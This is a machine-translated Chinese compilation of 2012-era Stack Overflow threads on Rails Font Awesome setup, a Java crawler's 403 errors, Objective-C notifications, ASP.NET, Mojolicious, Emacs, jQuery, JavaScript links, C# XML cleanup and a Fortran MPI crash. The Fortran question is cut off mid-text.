> 时间：2012-06-15T14:15:04.823
> 
> 标签：ruby-on-rails, fonts, font-awesome

我的网页设计师为我提供了已添加到字体真棒的更新字体/图标 - 他将其放置在本地字体文件夹中。我还得到了一个 font-awesome.css 文件。

我直接将字体文件夹复制到我的资产中，并将 font-awesome.css 放入资产/样式表中。

我的代码中正确引用了 css，但字体文件夹中的任何图标都没有加载。

我需要做些什么来确保正确加载所有内容和/或引用字体文件夹吗？

* * *

## 回答 #1

> 赞同：124
> 
> 时间：2012-06-15T15:28:54.840

首先：将 app/assets/fonts 添加到资产路径（config/application.rb）

```
config.assets.paths << Rails.root.join("app", "assets", "fonts") 
```

然后将字体文件移动到 /assets/fonts （首先创建文件夹）

现在将 font-awesome.css 重命名为 font-awesome.css.scss.erb 并像这样编辑它：更改：

```
@font-face {
  font-family: "FontAwesome";
  src: url('../font/fontawesome-webfont.eot');
  src: url('../font/fontawesome-webfont.eot?#iefix') format('eot'), url('../font/fontawesome-webfont.woff') format('woff'), url('../font/fontawesome-webfont.ttf') format('truetype'), url('../font/fontawesome-webfont.svg#FontAwesome')    format('svg');
  font-weight: normal;
  font-style: normal;
} 
```

对此：

```
@font-face {
  font-family: "FontAwesome";
  src: url('<%= asset_path("fontawesome-webfont.eot") %>');
  src: url('<%= asset_path("fontawesome-webfont.eot") + "?#iefix" %>') format('eot'), url('<%= asset_path("fontawesome-webfont.woff") %>') format('woff'), url('<%= asset_path("fontawesome-webfont.ttf") %>') format('truetype'), url('<%= asset_path("fontawesome-webfont.svg") + "#FontAwesome" %>') format('svg');
  font-weight: normal;
  font-style: normal;
} 
```

最后：检查所有资源是否正确加载（使用 Firebug 或 Chrome Inspector）

* * *

## 回答 #2

> 赞同：49
> 
> 时间：2013-07-23T09:09:40.037

现在有一种更简单的方法，只需添加`gem "font-awesome-rails"`到您的`Gemfile`并运行 `bundle install`.

然后在您的 application.css 中，包含 css 文件：

```
/*
 *= require font-awesome
 */ 
```

它会自动将 font-awesome 包含在您的资产管道中。完毕。开始使用它:)

有关更多信息，请查看[font-awesome-rails 文档](https://github.com/bokmann/font-awesome-rails)。

* * *

## 回答 #3

> 赞同：21
> 
> 时间：2014-03-23T01:10:37.560

我提供了另一个答案，在这个答案中，您不必担心宝石或路径或任何那些矫枉过正的解决方案。只需将此行粘贴到您的 application.html.erb （或您的布局的任何文件）中

```
<head>
...
<link href="//stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head> 
```

* * *

## 回答 #4

> 赞同：14
> 
> 时间：2015-03-10T16:09:59.167

除了 Vicoar 的回答

对于 Rails 4，您必须稍微改变 CSS。注意 font_url 的用法：

```
@font-face {
  font-family: "FontAwesome";
  src: font_url('fontawesome-webfont.eot');
  src: font_url('fontawesome-webfont.eot?#iefix') format('eot'), font_url('fontawesome-webfont.woff') format('woff'), font_url('fontawesome-webfont.ttf') format('truetype'), font_url('fontawesome-webfont.svg') format('svg');
  font-weight: normal;
  font-style: normal;
} 
```

* * *

## 回答 #5

> 赞同：5
> 
> 时间：2016-12-10T12:38:58.403

现在，以下方式是将 Font Awesome 与 Rails 集成的最简单方法：

**SASS 红宝石**

使用 Official Font Awesome SASS Ruby Gem 可以轻松地将 Font Awesome SASS 导入 Rails 项目。

**将此行添加到应用程序的 Gemfile：**

```
gem 'font-awesome-sass' 
```

**然后执行：**

```
$ bundle 
```

**将此添加到您的 Application.scss：**

```
@import "font-awesome-sprockets";
@import "font-awesome"; 
```

* * *

## 回答 #6

> 赞同：4
> 
> 时间：2020-06-14T15:32:20.250

对于 Rails 6 + Webpacker。

您可以使用 Yarn 安装：`yarn add @fortawesome/fontawesome-free`

然后`app/javascript/packs/application.js`你需要添加这一行：

```
require("@fortawesome/fontawesome-free/js/all") 
```

它对我有用！我希望可以帮助别人！

* * *

## 回答 #7

> 赞同：3
> 
> 时间：2018-09-24T03:30:11.187

刚刚使用 Rails 5.2 完成了这个，如果你不想使用[font-awesome-rails gem](https://github.com/bokmann/font-awesome-rails) ，我想分享一下它是如何工作的：

1.  将 FontAwesome 字体文件（EOT、WOFF 等）放在**/app/assets**、**/vendor/assets**或**/lib/assets**的适当命名的子文件夹中，例如：**/app/assets/fonts**。
2.  将此行添加到 config/initializers/assets.rb：

    *Rails.application.config.assets.paths << Rails.root.join("app", "assets", "fonts")*

3.  将 FontAwesome 的**all.css**重命名为**all.scss**。如果您不这样做，Rails 将不会在下一步中预处理路径引用。

4.  将字体文件的所有路径替换为 Rails 管道引用（即[font-url](https://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-font_url)或[assets-url](https://api.rubyonrails.org/classes/ActionView/Helpers/AssetUrlHelper.html#method-i-asset_url)）：

    **例如。前**

    *@font-face { font-family: 'Font Awesome 5 Free'; 字体样式：正常；字体粗细：900；src: url("../webfonts/fa-solid-900.eot"); src: url("../webfonts/fa-solid-900.eot?#iefix") 格式("embedded-opentype"), url("../webfonts/fa-solid-900.woff2") 格式( “woff2”），url（“../webfonts/fa-solid-900.woff”）格式（“woff”），url（“../webfonts/fa-solid-900.ttf”）格式（“truetype” "), url("../webfonts/fa-solid-900.svg#fontawesome") 格式("svg"); }*

    **例如。后**

    *@font-face { font-family: 'Font Awesome 5 Free'; 字体样式：正常；字体粗细：900；src:asset-url("fa-solid-900.eot"); src:asset-url("fa-solid-900.eot?#iefix") format("embedded-opentype"),asset-url("fa-solid-900.woff2") format("woff2"),asset -url("fa-solid-900.woff") 格式("woff")、asset-url("fa-solid-900.ttf") 格式("truetype")、asset-url("fa-solid- 900.svg#fontawesome") 格式("svg"); }*

5.  重新启动服务器。

* * *

## 回答 #8

> 赞同：3
> 
> 时间：2019-07-09T19:33:59.560

如何将 font-awesome 4 与准系统 Rails 6 和 Webpacker 一起使用，无需任何额外的 gem，将字体或 css 文件复制粘贴到您的应用程序中并做其他奇怪的事情：

添加 font-awesome npm 包——package.json：

```
{
  "dependencies": {
    "font-awesome": "4.7.0"
  }
} 
```

将 font-awesome css 文件包含到 css 清单中——app/stylesheets/application.css：

```
/*
 *= require font-awesome/css/font-awesome.min
 *= require_tree .
 *= require_self
 */ 
```

在我们的自定义 css 文件 app/stylesheets/font-awesome.css.erb 中覆盖字体定义：

```
@font-face {
  font-family: 'FontAwesome';
  src: url('<%= font_path('fontawesome-webfont.eot') %>');
  src: url('<%= font_path('fontawesome-webfont.eot') %>?#iefix') format('embedded-opentype'), url('<%= font_path('fontawesome-webfont.woff2') %>') format('woff2'), url('<%= font_path('fontawesome-webfont.woff') %>') format('woff'), url('<%= font_path('fontawesome-webfont.ttf') %>') format('truetype'), url('<%= font_path('fontawesome-webfont.svg') %>#fontawesomeregular') format('svg');
  font-weight: normal;
  font-style: normal;
} 
```

在资产管道中包含 node_modules font-awesome dir + 字体文件类型— config/initializers/assets.rb

```
Rails.application.config.assets.paths << Rails.root.join('node_modules/font-awesome/fonts')
Rails.application.config.assets.precompile << /\.(?:svg|eot|woff|ttf)\z/ 
```

您将获得包含并编译到 public/fonts 目录中的字体，并且您将获得单个 css 文件，其中包含所有内容（您的应用程序和 font-awesome）编译到其中。

问题是，font-awesome 缩小的 css 包含字体的硬编码路径，为了覆盖它，我们只需添加带有生成字体路径的 font-face 指令。因此，font-awesome.min.css 应该首先添加到清单文件中。

但是，虽然一切正常，但您会在控制台中收到 404 错误。我没能解决这个问题，最终放弃并改用`font-awesome-sass`gem。

* * *

## 回答 #9

> 赞同：1
> 
> 时间：2012-08-15T20:09:39.630

我试过 vicoar's ，但它不适用于我基于 ruby​​ 1.9.3 和 rails 3.2 的项目。然后我将文件名重命名`font-awesome.css`为`font-awesome.css.erb`并将其更改`@font-face`为：

```
@font-face {
  font-family: "FontAwesome";
  src: url(<%= asset_path 'fontawesome-webfont.eot' %>);
  src: url(<%= asset_path 'fontawesome-webfont.eot' + '?#iefix' %>) format('eot'), url(<%= asset_path 'fontawesome-webfont.woff' %>) format('woff'), url(<%= asset_path 'fontawesome-webfont.ttf' %>) format('truetype'), url(<%= asset_path 'fontawesome-webfont.svg' + '#FontAwesome' %>) format('svg');
  font-weight: normal;
  font-style: normal;
} 
```

它工作得很好，代码也很简单......（你可以参考指南[asset_pipeline](http://guides.rubyonrails.org/asset_pipeline.html)

* * *

## 回答 #10

> 赞同：0
> 
> 时间：2014-03-04T22:04:53.757

对于 rails 3.2.* 一个快速的解决方案：

1）将字体真棒文件放在公共文件夹中的“fonts”文件夹中 2）打开font-awesome.css并将文件顶部的“../fonts”的4个条目更改为“/fonts”

```
@font-face
{
     font-family:'FontAwesome';
     src:url('/fonts/fontawesome-webfont.eot?v=3.2.1');
     src:url('/fonts/fontawesome-webfont.eot?#iefix&v=3.2.1') 
     format('embedded-opentype'),url('/fonts/fontawesome-webfont.woff?v=3.2.1') 
     format('woff'),url('/fonts/fontawesome-webfont.ttf?v=3.2.1') 
     format('truetype'),url('../fonts/fontawesome-webfont.svg#fontawesomeregular?v=3.2.1') 
     format('svg');
     font-weight:normal;
     font-style:normal;
}
[class^="icon-"],[class*=" icon-"]
{
     font-family:FontAwesome;
     font-weight:normal;
     font-style:normal;
     text-decoration:inherit;
     -webkit-font-smoothing:antialiased;
     *margin-right:.3em;
} 
```

# java - IOException 缺乏详细信息 - 403 错误

> ID：11052402
> 
> 赞同：1
> 
> 时间：2012-06-15T14:15:34.530
> 
> 标签：java, web-crawler, ioexception

事情是：我有一个网络爬虫框架，以及实现这个框架的独立模块。所有这些模块都从特定新闻网站捕获新闻。

在框架中有 2 个不可预知的错误，它们是：IOException 和 SocketTimeoutException。出于显而易见的原因（网站可能处于离线状态和/或正在维护中）

事情是：在一个特定的网站[（这个）](http://www.agoramt.com.br/)中，我总是得到随机的 IOExceptions。我尝试预测它，但我仍然不知道为什么会出现此错误。

我认为这是在测试阶段用请求轰炸它。不是，因为在 2 或 3 天内没有发送另一份申请，它仍然会向我抛出错误。

**简而言之：**该站点不需要身份验证，它会随机抛出 403\. RANDOMLY

由于 403 可能是多个不同的错误，我想看看我的应用程序的具体问题是什么。

如果我能得到 which 403 it i，我可以尝试解决它。(403.1, 403.2, ..., 403.n)

```
//If you guys want the code, it's a basic Jsoup get. 
//(I have also tried it with native API, 
//and still get the same random 403 errors)

//Note that I also tried it with no redirection, and still get the error
Document doc = Jsoup
    .connect("http://www.agoramt.com.br/")
    .timeout(60000)
    .followRedirects(true)
    .get();

//You may criticize about the code. But this specific line is the one 
//that throws the error. And it doesn't randomly do that to other 3k
//site connections. That's why I want to get the specifics from the 403 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T12:28:15.247

服务器可能会一时兴起返回 403。除了尊重服务器不让您进入的意愿外，您不应最终解决此问题。您可以尝试阅读响应正文以获取服务器提供的详细信息，但这可能就是您所得到的全部。我相信，您正在寻找的 403.n*错误代码是***IIS**特有的功能，您指出的站点似乎与**nginx**一起服务，所以不要指望得到这些。

如果您的网络爬虫*随机*获取 403，但常规网络浏览器（来自同一 IP）*从未*获取 403，那么我建议您最好让网络爬虫请求标头看起来与常规网络浏览器发送的*完全一样。*对于礼貌的网络爬虫来说，这是否是正确的行为是一个不同的讨论。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-23T20:41:44.053

在设计网络爬虫时，应考虑意外中断和错误代码。

保留上次失败的站点队列，以便在一段时间后，网络爬虫可以重试请求。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-23T21:02:50.710

借助其他人所说的话，您的爬虫是否有可能被识别并视为网络扫描仪或渗透工具？

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-19T02:26:31.023

这可能是该站点的互联网连接有问题，它可能有代码试图阻止蜘蛛。途中可能有一个奇怪的代理服务器。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T14:20:56.413

问题可能是，您可以访问一个文件夹，您的程序想要读取站点上的所有文件，但网络服务器给出了 403 错误，并且可能会终止套接字。这就是我的想法，没有代码，我无法判断它是程序错误或只是网络服务器的配置。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-06-23T16:25:39.247

也许尝试将 index.php 添加到末尾（或者该站点的主主页是什么...... index.html 等......）

但是，我不确定这是否有助于解决您的问题。我使用我在某处找到的 Connection 类，它基本上说就像上面的帖子之一所说（模拟 Web 浏览器的标题，所以说......它看起来像是来自 FireFox，而不是 java 默认值是）。

我想这值得一试。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-06-24T13:51:21.123

我不知道 Jsoup 是什么，但我建议您阅读[HttpURLConnection.getErrorStream()](http://docs.oracle.com/javase/6/docs/api/java/net/HttpURLConnection.html#getErrorStream%28%29)。此方法将允许您阅读错误文档。在连接失败后也应该可以访问错误文档的标题字段，就像您通常访问标题字段的方式一样。这两者（正文和标题）一起将为您提供服务器提供的所有信息。

# objective-c - 如何创建一个侦听器（我认为这就是它的名称）以在满足条件时触发事件？

> ID：11052406
> 
> 赞同：0
> 
> 时间：2012-06-15T14:15:45.207
> 
> 标签：objective-c, xcode, event-handling

我需要在满足条件时触发（即随机移动的物体到达某个位置），但是我需要它一直在听，有点像按钮，当你按下时一直在听它。有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:20:01.290

您可以使用[`NotificationCenter`](https://developer.apple.com/library/ios/#documentation/Cocoa/Reference/Foundation/Classes/nsnotificationcenter_Class/Reference/Reference.html)并为其添加观察者：

```
[[NSNotificationCenter defaultCenter] addObserver:yourObserver selector:yourSelector name:kNotificationName object:nil]; 
```

这将使`yourObserver`通知发送如下：

```
[[NSNotificationCenter defaultCenter] postNotificationName:kNotificationName object:self userInfo:nil]; 
```

您可以阅读参考资料，了解有关发送`userInfo`带有通知的对象的更多选项。

编辑：

至于发布通知时，您没有提供太多上下文，但一般来说，知道对象是否已到达给定位置的唯一方法是每次在屏幕上移动对象时检查。

您可能会考虑使用用于游戏的物理引擎之一（花栗鼠、box2d）来检查与固定点的碰撞...但是此选项是否对您有意义取决于您的应用程序...

如果您正在移动响应触摸事件的对象，则检查对象是否已到达指定位置的正确位置是`touchesMoved`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T20:22:58.783

我认为您正在寻找的东西称为键值观察（[KVO](https://developer.apple.com/library/mac/#documentation/cocoa/Conceptual/KeyValueObserving/KeyValueObserving.html)）。
如果 randomMovingObject 具有包含该点的综合属性，则可以使用以下行开始观察它：

```
[randomlyMovingObject addObserver:theObserver forKeyPath:@"spot" options:(NSKeyValueObservingOptionNew | NSKeyValueObservingOptionOld) context:NULL]; 
```

为了对有关现场的变化做出反应，您必须在观察者中实现以下方法：

```
-(void)observeValueForKeyPath:(NSString *)theKeyPath ofObject:(id)theObject change:(NSDictionary *)change context:(void *)context {
    if ([theKeyPath isEqualToString:@"spot"]) {
        // react to changes
    }
} 
```

每次设置属性时，观察者都会收到通知。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T14:50:11.517

你可能在谈论通知？它们由 表示，并由`NSNotification`排队和分派`NSNotificationCenter`。

通知中心是系统的共享单例，所以要使用它，你要求它是`+defaultCenter`这样的：

```
NSNotificationCenter *myCenter = [NSNotificationCenter defaultCenter]; 
```

您可以通过两种主要方式之一将自己注册为给定通知的*观察者。*一、传统的：

```
 [myCenter addObserver:self selector:@selector(handleNotification:) name: NSApplicationWillHideNotification object:nil]; 
```

这告诉通知中心在发送到队列时发送`handleNotification:`选择器`self`。`NSApplicationWillHideNotification`to 的参数`handleNotification:`将是`NSNotification`发布到队列的对象。

“名称”决定了您希望收到通知的通知的“类型”或“种类”。我认为在任何地方都没有这些的大规范列表，但大多数都可以通过文档发现。例如，查看“NSApplication Class Reference”，底部有一个名为“Notifications”的完整部分，解释了它发布的内容以及原因。

注意 的最后一个参数`-addObserver:selector:name:object:`。如果您在那里传递一个对象而不是`nil`，那么您将只会收到从该对象发送的通知（与在系统上任何位置发布的具有该名称的所有通知相反......这可能非常嘈杂。）

请注意，对于您注册的每个通知，您还应该取消注册。如果您的观察者被释放并且通知中心尝试向垃圾内存发送消息，则可能会发生不好的事情！在你的`-dealloc`（或同等的）确保你添加：

```
[myCenter removeObserver:self name:NSApplicationWillHideNotification object:nil]; 
```

注册通知的第二种方法是使用块：

```
[self setMyNotificationObserver:[myCenter addObserverForName:NSApplicationWillHideNotification object:nil queue:[NSOperationQueue mainQueue] usingBlock:^(NSNotification *notification){
    // Do something...
}]]; 
```

`name:`并且`object:`是相同的。但是，不是使用选择器注册对象，而是注册一个块，只要收到具有给定名称的通知，就会调用该块。附加参数“queue”允许您指定在哪个`NSOperationQueue`通知上执行。这是使用这种通知处理方式的主要优势之一。通常，在发布原始通知的任何线程上都会调用通知的观察者。这使您可以指定始终在给定线程上调用处理程序。*对于必须*在主线程上执行的 UI 更新非常有用。

最后，请注意我们将返回的值赋给了`-addObserverForName:object:queue:usingBlock:`一个属性`myNotificationObserver`。这就是我们在使用块语法时取消注册观察者的方式。我们像这样使用它：

```
[myCenter removeObserver:[self myNotificationObserver]]; 
```

当然，您也可以将自己的自定义通知发布到`NSNotificationCenter`. [在通知编程主题](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Notifications/Introduction/introNotifications.html)中阅读此内容和各种其他通知内容

# asp.net - 为什么 SelectedIndex 不改变，保持为-1，即使在网站上改变了？

> ID：11052407
> 
> 赞同：0
> 
> 时间：2012-06-15T14:15:49.317
> 
> 标签：asp.net, vb.net, webforms

按钮代码：

```
Protected Sub btnAdd_Click(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnAdd.Click
    Dim li1 As ListItem
    Dim addList As New List(Of ListItem)

    If (ListBox1.SelectedIndex < 0) Then 'No user selected
        MsgBox("Please select a user to add from the Listbox on the left.", vbCritical, "ListBox2 Validation Error")
    Else
        For Each li1 In ListBox1.Items
            If li1.Selected = True Then
                adduser(li1.Selected.ToString, intKL)
            End If
        Next
    End If
End Sub 
```

使用以下方式清除和添加项目：

> ListBox2.Items.Clear()

和

```
While SQLdr.Read()
            If SQLdr.Item(0).ToString <> "" And SQLdr.Item(1).ToString <> "" Then
                ListBox2.Items.Add(SQLdr.Item(1).ToString & " - " & SQLdr.Item(0).ToString)
            End If
        End While 
```

下拉框的负载正在发生更新

这与自动回发和我认为的页面加载有关，有人可以帮忙吗

即使我在列表框中选择了一个项目，当我单击添加按钮时，它也会始终返回错误消息。我不认为 listbox changedselected 项目正在触发。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T08:04:13.647

谢谢科林，你的评论真的很有帮助。

问题是我在`dropbox1_load`子例程上填充列表框，因此每次进行回发时，列表框都会重新填充，并且不能每次都进行选择。SelectedItem 将恢复为 -1。

# perl - 为什么在使用 MojoX::JSON::RPC::Service 时，我的 Mojo 测试与 FF REST 客户端的工作方式不同？

> ID：11052411
> 
> 赞同：3
> 
> 时间：2012-06-15T14:15:57.413
> 
> 标签：perl, json-rpc, mojolicious

我的 Mojolicious 应用程序模块中有以下代码。当我使用 Test::Mojo $t->post_ok('hosts', encode_json( $json_string ) )->status_is(200) 运行它时，应用程序运行良好。当我使用 Firefox 休息客户端时，我从未通过 add_condition 路由修饰符“访问”。我转储了 $can 的结果（在 add_condition 块中），它是“1”。所以，在我看来，这应该继续到控制器上（就像我运行测试时所做的那样）。使用 FF 休息客户端时，这将返回 404，因为在访问条件返回 1 后没有任何反应。

知道为什么应用程序在这两种情况下会以不同的方式运行吗？

```
$self->plugin(
    'json_rpc_dispatcher',
    services => {
        '/auth'      => Package::Controller::Auth->new,
        '/user'      => Package::Controller::User->new,
        '/hosts'     => Package::Controller::Hosts->new,
    }   
);  

$self->app->routes->add_condition(
    access => sub {
        my ($rt, $cntrlr, $stuff) = @_; 
        my $sess = $cntrlr->stash('mojo.session');

        my $path = $cntrlr->req->url->path->parts;

        my $can = $self->can_access({ 
            route => $path->[0],
            args  => $sess,
        }); 

        $can && return 1;

        $cntrlr->render_json({
            error => 'Not Authorized',
            ok    => 0,
        }); 
    }   
); 

$self->hook( before_dispatch => sub {

    my $this = shift;

    my $params = $this->tx->req->json;

    if( !$this->session('auth') ) {
    my $login = $self->login({
            user     => $params->{params}{user},
            password => $params->{params}{password},
    });

        return { error => 'Invalid Username or password' } if $login->{error}; 
        my $access = $self->has_access( 
            $params->{params}{user}, $params->{params}{password}
        );

        return { error => 'Invalid credentials' } unless keys %{ $access };

        $this->session( auth => { dn => $params->{params}{user}, perms => $access } );

    }

    else {
        $r->find('auth' )->over('access');
        $r->find('user' )->over('access');
        $r->find('hosts')->over('access');
    }

} );  # hook 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T19:40:30.300

对不起。无论如何，这个问题与应用程序或 Mojolicious 无关（甚至与 perl 无关）。主机名未正确解析。

好吧，我不知道问题出在哪里。使用 morbo script/app daemon -l my.host.name.domain.com 启动服务器不起作用。

当我使用 morbo script/app daemon -l 192.168.1.11 （其中 192.168.1.11 是 my.host.name.domain.com 的 ip）时。事情开始按预期进行。

现在这些都不起作用。:(

# emacs - 如何设置 emacs eshell 默认面？

> ID：11052416
> 
> 赞同：1
> 
> 时间：2012-06-15T14:16:26.557
> 
> 标签：emacs, eshell, emacs-faces

当我在 emacs 中运行 eshell（或 shell）时，我希望默认面是不同的字体（如 Courier），这样 eshell 看起来更像一个“普通”的 shell。

查看 emacs 的 Faces，我看到了几个 eshell 特定的面（用于符号链接、目录、提示符等），但我没有看到任何基本的默认面。

谷歌返回了大量关于自定义 eshell 操作的结果，但很少返回关于自定义其外观的结果。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:35:03.950

```
(defun my-buffer-face-mode-courrier ()
    (interactive)
    (setq buffer-face-mode-face '(:family "Courrier"))
    (buffer-face-mode))

(add-hook 'eshell-mode-hook 'my-buffer-face-mode-courrier) 
```

本示例改编自：[http ://www.emacswiki.org/emacs/FacesPerBuffer](http://www.emacswiki.org/emacs/FacesPerBuffer)

# php - jquery 多个 ajax 请求 - 导致 php 对象出现问题

> ID：11052417
> 
> 赞同：0
> 
> 时间：2012-06-15T14:16:29.240
> 
> 标签：php, jquery, ajax, object

我正在尝试一次处理和更新 1000 个项目的查询。我厌倦了设置缓存为假，甚至尝试 setTimeout 在请求之间暂停。每个请求应该花费 5-6 秒，然后该过程将永远不会超时，但在 4-5 次请求后，它会达到服务器执行限制。

问题是我需要在更新查询中使用 PHP 对象。每个请求似乎都需要更长的时间，所以似乎对象在 PHP 中循环

有没有办法阻止这种情况发生？

这是javascript代码

```
function processIndex() {
    $.ajax({
        url: responder,
        dataType: "json",
        data: data,
        cache: false,
        async: false,
        error: function(XMLHttpRequest, textStatus, errorThrown){
        //  alert('status:' + XMLHttpRequest.status + ', status text: ' + XMLHttpRequest.statusText + ' LIMIT ' + limitFrom + ', ' + limitTo);
            limitFrom = limitTo;
            limitTo  += 1000;
            processIndex('indexPrices');
        },
        success: function(data) {
                    limitFrom = limitTo;
                    limitTo  += 1000;
                    setTimeout(function() {
                        processIndex();
                    }, 1000);
                }
            });
        }
    });
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:24:51.260

您可以使用 [http://www.protofunc.com/scripts/jquery/ajaxManager/](http://www.protofunc.com/scripts/jquery/ajaxManager/)

或者

[https://gist.github.com/2470554](https://gist.github.com/2470554)

排队 ajax 请求。

另一种方法是发送少量记录（例如一次 50 条记录）并在服务器端代码中循环遍历它们。

您可以结合这两种解决方案以获得最佳结果

# javascript - Javascript和带变量的href

> ID：11052419
> 
> 赞同：0
> 
> 时间：2012-06-15T14:16:29.887
> 
> 标签：javascript, html, variables, href

我对 javascript，我正在学习的一种新语言有点怀疑......

我有一个包含链接的变量，例如

```
var Link = "http://www.example.com/search?q=javascriptvariable&k=&e=1"; 
```

我想按下一个按钮并转到我保存在变量 Link 中的链接。我尝试过：

```
<a href=Link><input type="submit" value="Go" /></a> 
```

怎么了？

附言

我要编辑的链接不是我页面的链接（我不能使用 this.document.location.href）。我的按钮应该将用户重定向到另一个网站并进行自定义搜索。

**PPS** 如果你想要一个例子。我的网站上有一个文本框。[如果用户在我的文本框中写了一些东西并单击“开始”按钮，我的文本框中的文本将替换http://search.aol.com/aol/search?enabled_terms=&s_it=comsearch51&q=JAVASCRIPTVARIABLE](http://search.aol.com/aol/search?enabled_terms=&s_it=comsearch51&q=JAVASCRIPTVARIABLE)中的 JAVASCRIPTVARIABLE 并将打开 AOL 研究页面.

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:20:45.090

先给链接一个ID，

```
<a id="someLink"><input type="submit" value="Go" /></a> 
```

然后，在您的 javascript 中，您将需要

```
var Link = "http://www.example.com/search?q=javascriptvariable&k=&e=1";
document.getElementById('someLink').href = Link; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:18:55.597

您需要使用 JavaScript 进行设置。使用按钮也更好。

HTML：

```
<button id="go">Go!</button> 
```

​ JavaScript：

```
var Link = 'http://jsfiddle.net'

document.getElementById('go').onclick = function () {
    document.location= Link;
};​ 
```

工作示例：http: [//jsfiddle.net/PfWdW/](http://jsfiddle.net/PfWdW/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:19:07.770

做你的链接

```
<input type="button" value="Go" onclick="document.location= Link;" /> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:20:29.980

```
<input type="button" value="Go" onclick="location.href=Link;" /> 
```

只是注意到我不会推荐这种方法..而是直接回答上面的作品。为什么不只使用没有脚本的普通链接？

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-06-15T15:16:45.427

请尝试以下代码：

```
<input type="button" value="Go" onclick="window.location.href='http://www.example.com/search?q=javascriptvariable&k=&e=1'" /> 
```

# c# - 如何删除所有空的 XElement

> ID：11052420
> 
> 赞同：7
> 
> 时间：2012-06-15T14:16:33.263
> 
> 标签：c#, xml, recursion, linq-to-xml

这个有点棘手。假设我有这个 XmlDocument

```
<Object>
    <Property1>1</Property1>
    <Property2>2</Property2>
    <SubObject>
         <DeeplyNestedObject />
    </SubObject>
</Object> 
```

我想找回这个

```
<Object>
    <Property1>1</Property1>
    <Property2>2</Property2>
</Object> 
```

由于每个孩子`<SubObject>`都是空元素，我想摆脱它。使其具有挑战性的是，您无法在迭代节点时删除它们。任何帮助将非常感激。

**更新**这就是我的结论。

```
public XDocument Process()
{
    //Load my XDocument
    var xmlDoc = GetObjectXml(_source);

    //Keep track of empty elements
    var childrenToDelete = new List<XElement>();

    //Recursively iterate through each child node
    foreach (var node in xmlDoc.Root.Elements())
        Process(node, childrenToDelete);

    //An items marked for deletion can safely be removed here
    //Since we're not iterating over the source elements collection
    foreach (var deletion in childrenToDelete)
        deletion.Remove();

    return xmlDoc;
}

private void Process(XElement node, List<XElement> elementsToDelete)
{
    //Walk the child elements
    if (node.HasElements)
    {
        //This is the collection of child elements to be deleted 
        //for this particular node
        var childrenToDelete = new List<XElement>();

        //Recursively iterate each child
        foreach (var child in node.Elements())
            Process(child, childrenToDelete);

        //Delete all children that were marked as empty
        foreach (var deletion in childrenToDelete)
            deletion.Remove();

        //Since we just removed all this nodes empty children
        //delete it if there's nothing left
        if (node.IsEmpty)
            elementsToDelete.Add(node);
    }

    //The current leaf node is empty so mark it for deletion
    else if (node.IsEmpty)
        elementsToDelete.Add(node);
} 
```

如果有人对此用例感兴趣，那就是我放在一起的[ObjectFilter项目。](https://github.com/micahlmartin/ObjectFilter)

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-06-15T14:21:26.193

这会很慢，但你可以这样做：

```
XElement xml;
while (true) {
    var empties = xml.Descendants().Where(x => x.IsEmpty && !x.HasAttributes).ToList();
    if (empties.Count == 0)
        break;

    empties.ForEach(e => e.Remove());
} 
```

为了使其更快，您可以在第一次迭代后向上走父节点，看看它们是否为空。

```
XElement xml;
var empties = xml.Descendants().Where(x => x.IsEmpty && !x.HasAttributes).ToList();
while (empties.Count > 0) {
    var parents = empties.Select(e => e.Parent)
                         .Where(e => e != null)
                         .Distinct()    //In case we have two empty siblings, don't try to remove the parent twice
                         .ToList();

    empties.ForEach(e => e.Remove());

    //Filter the parent nodes to the ones that just became empty.
    parents.RemoveAll(e => e.IsEmpty && !e.HasAttributes);
    empties = parents;
} 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-06-15T17:34:51.617

在这里，我创建了一个 XML 文件，其中放置了所有 xml 代码。您还可以使用`XmlLoad("")`来加载 xml。这将工作代码与文件加载。您也可以尝试使用 XmlLoad。

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Xml;

namespace Test
{
    class Program
    {
        static void Main(string[] args)
        {
            XmlDocument doc = new XmlDocument();
            doc.Load("Test.xml");
            XmlElement root = doc.DocumentElement;
            foreach (var item in root)
            {
                XmlElement elem = (XmlElement)item;
                if (elem.InnerText.Equals(""))
                {
                    foreach (var child in elem.ChildNodes)
                    {
                        XmlElement childelem = (XmlElement)child;
                        childelem.RemoveAll();
                    }

                    elem.ParentNode.RemoveChild(elem);
                }
            }
            doc.Save("Test.xml");
            Console.ReadLine();
        }
    }
} 
```

# fortran - 使用 MPI-2 的 RMA 函数的 Fortran 程序中的分段错误

> ID：11052421
> 
> 赞同：5
> 
> 时间：2012-06-15T14:16:36.463
> 
> 标签：fortran, mpi, mpi-rma

只要包含 MPI_GET 调用，以下简短的 Fortran90 程序就会崩溃。Rank 1 尝试从 rank 0 中读取一个值并在 MPI_WIN_UNLOCK 中挂起。等级 0 尝试在 MPI_BARRIER 中崩溃并出现分段错误。

我反复检查命令的语法，但它们似乎是正确的。C/C++ 中的类似代码在同一系统上工作。

